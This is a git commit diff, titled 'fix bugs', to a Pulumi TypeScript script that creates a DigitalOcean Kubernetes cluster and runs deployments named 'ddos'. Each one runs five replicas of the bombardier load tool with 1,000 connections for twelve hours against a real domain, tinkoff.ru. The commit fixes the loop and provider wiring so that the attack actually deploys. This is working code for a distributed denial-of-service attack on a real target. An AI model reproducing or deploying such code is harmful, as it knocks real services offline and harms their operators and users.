6b5aaf2f67ac12eeba9bc76a222ccd970eed64a4
londra <me@londra.dev>
2022-02-26 21:43:57 +0200

    fix bugs

--- index.ts
+++ index.ts
@@ -3,7 +3,7 @@ import * as digitalocean from "@pulumi/digitalocean";
 
 const cluster = new digitalocean.KubernetesCluster("do-k8s", {
     region: digitalocean.Region.FRA1,
-    version: "latest",
+    version: digitalocean.getKubernetesVersions({versionPrefix: "1.21"}).then(p => p.latestVersion),
     nodePool: {
         name: "default",
         size: digitalocean.DropletSlug.DropletS1VCPU2GB,
@@ -18,9 +18,9 @@ export const kubeconfig = cluster.kubeConfigs[0].rawConfig;
 const provider = new k8s.Provider("do-k8s", { kubeconfig })
 
 const tartgetsList = ["tinkoff.ru"]
-for (const target in tartgetsList){
+tartgetsList.forEach((target, index) => {
 const appLabels = { app: "ddos" };
-const deployment = new k8s.apps.v1.Deployment("ddos", {
+const deployment = new k8s.apps.v1.Deployment(`ddos-${index}`, {
     spec: {
         selector: { matchLabels: appLabels },
         replicas: 5,
@@ -29,5 +29,5 @@ const deployment = new k8s.apps.v1.Deployment("ddos", {
             spec: { containers: [{ name: "ddos", image: "alpine/bombardier", args: ["-c", "1000", "-d", "43200s", "-l", target]}] }
         }
     }
-}, { dependsOn: [cluster] });
-}
+}, { provider });
+});
